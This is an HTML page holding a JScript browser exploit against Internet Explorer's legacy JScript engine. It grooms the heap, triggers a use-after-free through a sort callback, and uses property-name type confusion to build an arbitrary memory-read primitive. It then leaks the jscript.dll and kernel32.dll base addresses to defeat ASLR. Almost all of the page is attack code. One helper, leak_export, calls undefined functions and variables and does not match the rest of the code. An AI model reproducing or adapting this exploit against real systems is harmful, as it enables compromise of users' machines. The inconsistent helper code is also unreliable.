<!DOCTYPE html>
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
<script language="JScript.Compact">

function CreateVar32(Type, ObjPtr, NextVar) {
   var Data = new Array(); // Every element of this array will be a WORD
   Data.push(Type, 0x00, 0x00, 0x00,
          ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF,
          NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
   return String.fromCharCode.apply(null, Data);
}
  
var UntrackedVarCount = 300;
var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 20000;

var SortDepth = 0;
var SortArray = new Array(); // Array to be "sorted" by glitched method

function GlitchedSort(untracked_1, untracked_2) {
    untracked_1 = VarSpray[SortDepth*2];
    untracked_2 = VarSpray[SortDepth*2 + 1];
	
    if(SortDepth > (UntrackedVarCount / 2)) {
        VarSpray = new Array(); // Erase VarSpray
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(untracked_1);
        UntrackedVarSet.push(untracked_2);
        return 0;
    }
    
    SortDepth += 1;
    SortArray[SortDepth].sort(GlitchedSort);
    UntrackedVarSet.push(untracked_1);
    UntrackedVarSet.push(untracked_2);
    return 0;
}

function NewUntrackedVarSet(Count) {
	SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedSort); // Two untracked vars will be passed to this method by the JS engine
}

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;

function ReClaimNameList(AnchorIndex, Value, PropertyName) {
	CollectGarbage(); // Cleanup
	AnchorObjectsBackup[AnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
	CollectGarbage(); // Free the leaked NameList
	AnchorObjectsBackup[AnchorIndex] = new Object();
	AnchorObjectsBackup[AnchorIndex][Array(379).join('A')] = 1; // 0x17a property name size for 0x648 NameList allocation size
	AnchorObjectsBackup[AnchorIndex]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
	AnchorObjectsBackup[AnchorIndex]["\u0003"] = 1;
	AnchorObjectsBackup[AnchorIndex][PropertyName] = Value; // The mutable variable
}

var MutableVar;

function LeakByte(Address) {
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakDword(Address) {
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakObjectAddress(ObjVarAddress, ObjVarValue) {
	ReClaimNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LeakDword((LowWord + (HighWord << 16)) + 8); // The VAR at the start of the VVAL has an object pointer that points to yet another VAR: this second one will have the actual address of the object in its object pointer field
}

function DiveModuleBase(Address) {
    var Base = (Address & 0xFFFF0000) + 0x4e; // Set to starting search point
	
    while(true) {
        if(LeakDword(Base) == 0x73696854) { // The string 'This'
            Base -= 0x4e; // Subtract the offset to get the base
            return Base;
        }
		
        Base -= 0x10000;
    }
	
	return 0;
}

function Exploit() {
	// Initialization
	
	for(i = 0; i < 310; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort method
	var LFHBlocks = new Array();

	// Trigger LFH for a size of 0x648

	for(i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
        LFHBlocks.push(Temp);
    }
	
	// New set of untracked vars in freed GcBlock
	
	NewUntrackedVarSet(UntrackedVarCount);
	
	// Re-claim with type confusion NameLists
	
	for(i = 0; i < NameListAnchorCount; i++) {
		NameListAnchors[i][Array(379).join('A')] = 1; // 0x17a property name size for 0x648 NameList allocation size
		NameListAnchors[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
		NameListAnchors[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
		NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
	}
		
	// Leak final VVAL address from one of the NameLists
	
	AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    
	var LeakedVvalAddress = 0;
	
    for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] > 0x1000) {
            LeakedVvalAddress = UntrackedVarSet[i];
			break;
        }
    }

	if(LeakedVvalAddress != 0) {
		//alert("leaked final VVAL address of " + LeakedVvalAddress.toString(16));
		var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

		for(i=0; i < 46; i++) {
			PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress, 0);
		}
		
		while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

		// New set of untracked vars in freed GcBlock
		
		NewUntrackedVarSet(UntrackedVarCount);
		
		// Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
		
		for(i = 0; i < NameListAnchorCount; i++) {
			NameListAnchors[i][PrimaryVvalPropName] = 1;
		}
		
		// Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
		
		var LeakedVvalVar;

		for(i = 0; i < UntrackedVarSet.length; i++) {
			if(typeof UntrackedVarSet[i] === "number") {
				LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
				LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
				break;
			}
		}
		
		//alert("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
		
		// Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
		
		ReClaimNameList(LeakedAnchorIndex, 0x11, "A"); // Verify the authenticity of the underlying anchor object index behind NameList containing leaked VVAL address
		
		if(LeakedVvalVar + "" == 0x11) {
			//alert("Leaked anchor object re-claim verification success");
			// Create the mutable variable which will be used throughout the remainder of the exploit
		
			ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x22, 0));
			
			var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

			for(i=0; i < 46; i++) {
				PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress + 0x30, 0); // +0x30 is the offset to property name field of 32-bit VVAL struct
			}
			
			while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a
			
			// New set of untracked vars in freed GcBlock
			
			NewUntrackedVarSet(UntrackedVarCount);
			
			// Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
			
			for(i = 0; i < NameListAnchorCount; i++) {
				NameListAnchors[i][PrimaryVvalPropName] = 1;
			}

			for(i = 0; i < UntrackedVarSet.length; i++) {
				if(typeof UntrackedVarSet[i] === "number") {
					if(UntrackedVarSet[i] + "" == 0x22) {
						MutableVar = UntrackedVarSet[i];
						break;
					}
				}
			}
			
			// Verify the mutable var can be changed via simple re-claim
			
			
			ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x33, 0));
			
			if(MutableVar + "" == 0x33) {
				//alert("Verified mutable variable modification via re-claim");
				// Test arbitrary read primitive
				
				if(LeakByte(LeakedVvalAddress + 0x30) == 0x8) { // Change mutable var to a BSTR pointing at itself.
					//alert("Memory leak test successful");
					// Derive jscript.dll base from leaked Object vtable
				
					var Obj = new Object();
					var ObjectAddress = LeakObjectAddress(LeakedVvalAddress, Obj);
					
					//alert("Leaked object address: " + ObjectAddress.toString(16));
					
					var VtableAddress = LeakDword(ObjectAddress);
					
					//alert("Leaked vtable address: " + VtableAddress.toString(16));
					
					var JScriptBase = DiveModuleBase(VtableAddress);
					
					if(JScriptBase != 0) {
						alert("Leaked JScript base address: " + JScriptBase.toString(16));
						// Get the kernel32 base by following the jscript import table
						var kernel32_leak = WalkIAT(JScriptBase, 0x4e52454b, 0x32334c45);
						var kernel32_base = DiveModuleBase(kernel32_leak);
						alert("Successfully resolved kernel32.dll base at 0x" + kernel32_base.toString(16));
					}
					else {
						alert("Failed to leak JScript.dll base address");
					}
				}
				else {
					alert("Memory leak test failed");
				}
			}
			else {
				alert("Failed to verify mutable variable modification via re-claim");
			}
		}
		else {
			alert("Failed to leak final VVAL address");
		}
	}
	else {
		alert("Leaked anchor object type confusion re-claim failed");
	}
}

// leak_module: Used to leak a pointer for a given module that is imported by another module by traversing the PE structure in-memory.
function WalkIAT(Base, target_name_lower, target_name_upper) {
	var ExtractedAddresss = 0;
    // Get IMAGE_NT_HEADERS pointer
    var FileHdr = LeakDword(Base + 0x3c);

    // Get imports
    var ImportDataDir = Base + FileHdr + 0x80; // Import Directory offset location
    var IatRva = LeakDword(ImportDataDir);
    alert("[+] IAT RVA = 0x" + IatRva.toString(16));

    var IatSize = LeakDword(ImportDataDir + 0x4); // Get the size field of the import data dir

	var CurrentNameDesc = Base + IatRva;
    while(IatSize != 0) {
        name_ptr = LeakDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
        if(name_ptr == 0) {
            throw Error("Couldn't find the target module name");
        }
        name_lower = LeakDword(Base + name_ptr);
        name_upper = LeakDword(Base + name_ptr + 4);
        if(name_lower == target_name_lower && name_upper == target_name_upper) {
            ThunkAddress = LeakDword(CurrentNameDesc + 0x10); // Import Address Table
            ExtractedAddresss = LeakDword(Base + ThunkAddress + 8); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
            break;
        }
        IatSize -= 0x14; // The size of each entry
        CurrentNameDesc += 0x14; // Increase entry pointer
    }
	
	return ExtractedAddresss;
}

function leak_export(base, target_name_first, target_name_second, target_name_third, target_name_fourth) {
    // Get IMAGE_NT_HEADERS pointer
    module_lower = base.lower + 0x3c; // PE Header offset location
    module_upper = base.upper;
    file_addr = LeakDword(module_lower, module_upper, 1);

    // Get exports
    module_lower = base.lower + file_addr + 0x78; // Export Directory offset location
    export_dir = LeakDword(module_lower, module_upper, 1);
    alert("[+] Export offset at 0x" + import_dir.toString(16));

    // Get the number of exports
    module_lower = base.lower + export_dir + 0x14; // Number of items offset
    export_num = LeakDword(module_lower, module_upper, 1);
    write_debug("[+] Export count is " + export_num);

    // Get the address offset
    module_lower = base.lower + export_dir + 0x1c; // Address offset
    addresses = LeakDword(module_lower, module_upper, 1);
    write_debug("[+] Export address offset at 0x" + addresses.toString(16));

    // Get the names offset
    module_lower = base.lower + export_dir + 0x20; // Names offset
    names = LeakDword(module_lower, module_upper, 1);
    write_debug("[+] Export names offset at 0x" + names.toString(16));

    // Get the ordinals offset
    module_lower = base.lower + export_dir + 0x24; // Ordinals offset
    ordinals = LeakDword(module_lower, module_upper, 1);
    write_debug("[+] Export ordinals offset at 0x" + ordinals.toString(16));

    // Binary search because linear search is too slow
    upper_limit = export_num; // Largest number in search space
    lower_limit = 0; // Smallest number in search space
    num_pointer = Math.floor(export_num/2);
    module_lower = base.lower + names;
    search_complete = false;

    while(!search_complete) {
        module_lower = base.lower + names + 4*num_pointer; // Point to the name string offset
        function_str_offset = LeakDword(module_lower, module_upper, 0); // Get the offset to the name string
        module_lower = base.lower + function_str_offset; // Point to the string
        function_str_lower = LeakDword(module_lower, module_upper, 0); // Get the first 4 bytes of the string
        res = compare_nums(target_name_first, function_str_lower);
        if(!res && target_name_second) {
            function_str_second = LeakDword(module_lower + 4, module_upper, 0); // Get the next 4 bytes of the string
            res = compare_nums(target_name_second, function_str_second);
            if(!res && target_name_third) {
                function_str_third = LeakDword(module_lower + 8, module_upper, 0); // Get the next 4 bytes of the string
                res = compare_nums(target_name_third, function_str_third);
                if(!res && target_name_fourth) {
                    function_str_fourth = LeakDword(module_lower + 12, module_upper, 0); // Get the next 4 bytes of the string
                    res = compare_nums(target_name_fourth, function_str_fourth);
                }
            }
        }
        if(!res) { // equal
            module_lower = base.lower + ordinals + 2*num_pointer;
            ordinal = read_word(module_lower, module_upper, 0);
            module_lower = base.lower + addresses + 4*ordinal;
            function_offset = LeakDword(module_lower, module_upper, 0);
            write_debug("[+] Found target export at offset 0x" + function_offset.toString(16));
            return {'lower': base.lower + function_offset, 'upper': base.upper};
        } if(res == 1) {
            if(upper_limit == num_pointer) {
                throw Error("Failed to find the target export.");
            }
            upper_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + lower_limit) / 2);
        } else {
            if(lower_limit == num_pointer) {
                throw Error("Failed to find the target export.");
            }
            lower_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + upper_limit) / 2);
        }
        if(num_pointer == upper_limit && num_pointer == lower_limit) {
            throw Error("Failed to find the target export.");
        }
    }
    throw Error("Failed to find matching export.");
}


// compare_nums: Compares two numbers that represent 4-byte strings for equality. If not, it detects which character is larger or smaller.
function compare_nums(target, current) { // return -1 for target being greater, 0 for equal, 1 for current being greater
    write_debug("[*] Comparing 0x" + target.toString(16) + " and 0x" + current.toString(16));
    if(target == current) {
        write_debug("[+] Equal!");
        return 0;
    }
    while(target != 0 && current != 0) {
        if((target & 0xff) > (current & 0xff)) {
            return -1;
        } else if((target & 0xff) < (current & 0xff)) {
            return 1;
        }
        target = target >> 8;
        current = current >> 8;
    }
}

Exploit();

</script>
</head>
</html>